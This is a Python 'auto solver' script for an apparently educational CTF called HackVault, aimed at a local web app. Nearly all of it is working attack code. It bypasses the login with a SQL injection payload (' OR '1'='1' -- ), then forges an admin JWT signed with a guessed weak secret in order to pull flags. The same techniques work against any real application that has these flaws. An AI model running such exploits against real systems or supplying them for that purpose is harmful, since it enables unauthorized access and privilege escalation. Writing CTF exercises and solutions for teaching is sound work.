"""
HackVault CTF - Exploit Script
Demonstrates both vulnerabilities programmatically.
Author: Ashton Hicks
"""

import requests
import jwt
import datetime

BASE = "http://localhost:5000"

print("=" * 50)
print("  HackVault CTF - Auto Solver")
print("=" * 50)

# ─── FLAG 1: SQL Injection ───────────────────────────
print("\n[*] Attempting SQL Injection...")

payload = {
    "username": "' OR '1'='1' -- ",
    "password": "anything"
}

s = requests.Session()
r = s.post(f"{BASE}/login", data=payload, allow_redirects=True)

if "Flag 1" in r.text or "CTF{" in r.text:
    print("[+] SQL Injection successful!")
    # Get flag
    r2 = s.get(f"{BASE}/flag1")
    import re
    flag = re.search(r'CTF\{[^}]+\}', r2.text)
    if flag:
        print(f"[+] FLAG 1: {flag.group()}")
else:
    print("[-] SQL Injection failed. Is the app running?")

# ─── FLAG 2: JWT Forgery ─────────────────────────────
print("\n[*] Forging JWT token with role=admin...")

JWT_SECRET = "password1"  # Brute-forced / found in source

forged_token = jwt.encode({
    "username": "hacker",
    "role": "admin",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}, JWT_SECRET, algorithm="HS256")

print(f"[*] Forged token: {forged_token[:60]}...")

r3 = requests.get(f"{BASE}/admin", params={"token": forged_token})

flag2 = re.search(r'CTF\{[^}]+\}', r3.text)
if flag2:
    print(f"[+] FLAG 2: {flag2.group()}")
else:
    print("[-] JWT forgery failed. Check the app is running.")

print("\n[✓] Done!")
